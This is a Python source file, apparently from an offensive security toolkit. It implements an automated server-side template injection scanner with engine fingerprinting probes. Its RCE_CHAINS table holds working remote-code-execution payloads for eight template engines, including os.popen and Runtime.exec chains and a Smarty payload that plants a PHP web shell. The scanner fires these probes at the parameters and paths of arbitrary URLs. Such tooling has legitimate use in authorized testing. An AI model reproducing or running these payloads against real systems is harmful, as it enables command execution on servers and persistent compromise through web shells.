"""bingo/tools/ssti_scanner.py — SSTI 자동 탐지 + 엔진 식별 + RCE 체인 (v2.6.0)"""
from __future__ import annotations

import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Callable


# ── 탐지 ─────────────────────────────────────────────────────────────────────
POLYGLOT = "${{<%[%'\"}}%\\"        # 멀티 엔진 오류 유발
PROBE_MAP: dict[str, list[tuple[str, str]]] = {
    "Jinja2":      [("{{7*7}}", "49"), ("{{7*'7'}}", "7777777")],
    "Twig":        [("{{7*7}}", "49"), ("{{7*'7'}}", "49")],
    "Freemarker":  [("${7*7}", "49"), ("<#assign x=7*7>${x}", "49")],
    "Smarty":      [("{$smarty.version}", ""), ("{7*7}", "49")],
    "Velocity":    [("#set($x=7*7)${x}", "49")],
    "Mako":        [("${7*7}", "49")],
    "Pebble":      [("{{7*7}}", "49")],
    "Thymeleaf":   [("__${7*7}__::.x", "49"), ("[[${7*7}]]", "49")],
}

# ── RCE 체인 ──────────────────────────────────────────────────────────────────
RCE_CHAINS: dict[str, list[str]] = {
    "Jinja2": [
        # Python 3
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
        "{%for x in ().__class__.__base__.__subclasses__()%}{%if x.__name__=='catch_warnings'%}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}",
    ],
    "Twig": [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|map('system')|join}}",
        "{{_self.env.registerUndefinedFilterCallback('shell_exec')}}{{_self.env.getFilter('id')}}",
    ],
    "Freemarker": [
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    ],
    "Smarty": [
        "{php}echo `id`;{/php}",
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']);?>\",self::clearConfig())}",
    ],
    "Velocity": [
        "#set($e=\"e\")$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",\"test\".getClass()).invoke($e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"id\")",
    ],
    "Mako": [
        "${__import__('os').popen('id').read()}",
    ],
    "Pebble": [
        "{% set cmd = 'id' %}{% set bytes = [1].getClass().forName('java.lang.Runtime').methods[6].invoke([1].getClass().forName('java.lang.Runtime').methods[7].invoke(null), cmd.split(' ')).inputStream.readAllBytes() %}{{ bytes }}",
    ],
    "Thymeleaf": [
        "__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}__::.x",
    ],
}


@dataclass
class SstiFinding:
    engine: str
    param: str
    url: str
    probe_payload: str
    probe_response: str
    confirmed: bool
    rce_payloads: list[str] = field(default_factory=list)
    severity: str = "CRITICAL"
    notes: str = ""


@dataclass
class SstiReport:
    target: str
    findings: list[SstiFinding] = field(default_factory=list)

    @property
    def confirmed(self) -> list[SstiFinding]:
        return [f for f in self.findings if f.confirmed]

    @property
    def summary(self) -> str:
        if not self.confirmed:
            return "No SSTI detected"
        return f"SSTI confirmed ({', '.join(f.engine for f in self.confirmed)})"


class SstiScanner:
    """SSTI 자동 탐지 + 엔진 식별 + RCE 체인 제공"""

    def __init__(
        self,
        request_fn: Callable[[str, str, dict, str], tuple[int, str]],
        base_url: str,
        headers: dict | None = None,
    ) -> None:
        self.req = request_fn   # (url, method, headers, body) → (status, body)
        self.base = base_url.rstrip("/")
        self.headers = headers or {}

    # ── 파라미터 추출 ─────────────────────────────────────────────────────────
    def _extract_params(self, url: str) -> list[str]:
        parsed = urllib.parse.urlparse(url)
        params = list(urllib.parse.parse_qs(parsed.query).keys())
        return params

    # ── 단일 파라미터 테스트 ──────────────────────────────────────────────────
    def test_param(self, url: str, param: str, method: str = "GET") -> list[SstiFinding]:
        findings: list[SstiFinding] = []
        parsed = urllib.parse.urlparse(url)
        qs = dict(urllib.parse.parse_qsl(parsed.query))

        for engine, probes in PROBE_MAP.items():
            for payload, expected in probes:
                qs[param] = payload
                test_url = urllib.parse.urlunparse(
                    parsed._replace(query=urllib.parse.urlencode(qs))
                )
                try:
                    body_data = f"{param}={urllib.parse.quote(payload)}" if method == "POST" else ""
                    _, resp = self.req(test_url if method == "GET" else url, method, self.headers, body_data)
                    confirmed = expected and expected in resp
                    if confirmed or (POLYGLOT[:4] in payload and any(
                        err in resp for err in ["TemplateSyntaxError", "ParseError", "Template error",
                                                 "Undefined variable", "freemarker", "velocity"]
                    )):
                        findings.append(SstiFinding(
                            engine=engine,
                            param=param,
                            url=test_url,
                            probe_payload=payload,
                            probe_response=resp[:200],
                            confirmed=confirmed,
                            rce_payloads=RCE_CHAINS.get(engine, []),
                        ))
                        if confirmed:
                            break  # 엔진 확인됨, 더 이상 이 엔진 테스트 불필요
                except Exception:
                    pass
        return findings

    # ── 전체 자동 스캔 ────────────────────────────────────────────────────────
    def auto_scan(self, urls: list[str] | None = None) -> SstiReport:
        report = SstiReport(target=self.base)
        scan_urls = urls or [self.base]

        for url in scan_urls:
            params = self._extract_params(url)
            if not params:
                # URL 경로에 직접 삽입 시도
                for engine, probes in PROBE_MAP.items():
                    for payload, expected in probes[:1]:
                        test_url = url.rstrip("/") + "/" + urllib.parse.quote(payload)
                        try:
                            _, resp = self.req(test_url, "GET", self.headers, "")
                            if expected and expected in resp:
                                report.findings.append(SstiFinding(
                                    engine=engine, param="path",
                                    url=test_url, probe_payload=payload,
                                    probe_response=resp[:200], confirmed=True,
                                    rce_payloads=RCE_CHAINS.get(engine, []),
                                ))
                        except Exception:
                            pass
            else:
                for param in params:
                    findings = self.test_param(url, param)
                    report.findings.extend(findings)
        return report
